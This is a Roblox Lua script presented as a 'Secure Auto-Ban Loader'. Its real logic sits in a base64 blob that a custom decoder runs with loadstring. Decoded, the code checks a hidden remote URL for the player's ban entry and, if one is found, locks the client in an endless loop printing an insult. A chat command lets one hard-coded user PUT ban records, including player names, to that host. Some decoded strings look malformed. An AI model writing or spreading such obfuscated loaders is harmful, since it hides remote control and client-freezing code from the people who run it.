-- [[ ScriptStore v1.3 - Secure Auto-Ban Loader ]]
local _storage = "LS1bWyBTY3JpcHRTdG9yZSB2MS4zIC0gQXV0by1CYW4gTG9naWMgXV0KbG9jYWwgSHR0cFNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIkh0dHBTZXJ2aWNlIikKbG9jYWwgUGxheWVycyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCmxvY2FsIExQID0gUGxheWVycy5Mb2NhbFBsYXllcgpsb2NhbCBtZXVJRCA9IDEyMzQ1Njc4IApsb2NhbCBkaWMgPSB7IGE9ImgiLCBiPSJ0IiwgYz0icCIsIGQ9InMiLCBlPSI6IiwgZj0iLyIsIGc9Ii4iLCBoPSJhIiwgaT0ibCIsIGo9ImUiLCBrPSJyIiwgbD0iaSIsIG09Im8iLCBuPSItIiwgbz0iYyIsIHA9ImQiLCBxPSI0Iiwgcj0iNiIsIHM9ImYiLCB0PSJiIiwgdT0ibiIsIHY9Im0iLCB4PSJ5Iiwgej0iZyIgfQpsb2NhbCBtZXN0cmUgPSB7ImEiLCJiIiwiYiIsImMiLCJkIiwiZSIsImYiLCJmIiwiaCIsImkiLCJqIiwiaCIsImIiLCJtIiwiayIsImwiLCJoIiwibiIsInEiLCJvIiwicCIsInEiLCJyIiwibiIsInAiLCJqIiwicyIsImgiLCJnIiwiaSIsImIiLCJuIiwiayIsImIiLCJwIiwidCIsImciLCJzIiwibCIsImsiLCJqIiwidCIsImgiLCJkIiwiaiIsImwiLCJtIiwiaiIsIm8iLCJtIiwidiIsImYiLCJkIiwibyIsImsiLCJtIiwiaCIsImIiLCJkIn0KCmZ1bmN0aW9uIGdldFVybCgpIGxvY2FsIHUgPSAiIiBmb3IgXywgdiBpbiBpcGFpcnMobWVzdHJlKSBkbyB1ID0gdSAuLiBkaWNbdl0gZW5kIHJldHVybiB1IC4uICIvIiBlbmQKbG9jYWwgZmIgPSBnZXRVcmwoKQoKZnVuY3Rpb24gdmVyaWZpY2FyKCkgbG9jYWwgcyw rID0gcGNhbGwoZnVuY3Rpb24oKSByZXR1cm4gZ2FtZTpIdHRwR2V0KGZiIC4uICJCYW5zLyIgLi4gTFAuVXNlcklkIC4uICIuanNvbiIpIGVuZCkgaWYgcyBhbmQgciB+PSAibnVsbCIgdGhlbiB3aGlsZSB0cnVlIGRvIHByaW50KCJWQUkgVE9NQVIgTk8gU0VVIApDVSUpIHdhcm4oIlZBSTAgVE9NQVIgTk8gU0VVIApDVSUpIHRhc2sud2FpdCgwLjAxKSBlbmQgZW5kIGVuZAp2ZXJpZmljYXIoKQoKZnVuY3Rpb24gYmFuaXMoaWQpIGlmIExQLlVzZXJJZCA9PSBtZXVJRCB0aGVuIGxvY2FsIGRhZG9zID0gSHR0cFNlcnZpY2U6SlNPTkVuY29kZSh7c3RhdHVzID0gImJhbmlkbyIsIHBvciA9IExQLk5hbWUsIGRhdGEgPSBvcy5kYXRlKCIleCIpfSkgcGNhbGwoZnVuY3Rpb24oKSByZXF1ZXN0KHtVcmwgPSBmYiAuLiAiQmFucy8iIC4uIGlkIC4uICIuanNvbiIsIE1ldGhvZCA9ICJQVVQiLCBIZWFkZXJzID0ge1siQ29udGVudC1UeXBlIl0gPSAiYXBwbGljYXRpb24vanNvbiJ9LCBCb2R5ID0gZGFkb3N9KSBlbmQpIGVuZCBlbmQKCkxQLkNoYXR0ZWQ6Q29ubmVjdChmdW5jdGlvbihtc2cpIGlmIExQLlVzZXJJZCA9PSBtZXVJRCBhbmQgbXNnOnN1YigxLDUpID09ICIuYmFuICIgdGhlbiBiYW5pcyh0b251bWJlcihtc2c6c3ViKDYpKSkgZW5kIGVuZCk="

local function _exec(data)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^'..b..'=]', '')
    local dec = (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d%d%d%d%d%d', function(x)
        local n=0
        for i=1,8 do n=n+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(n)
    end))
    loadstring(dec)()
end
_exec(_storage)
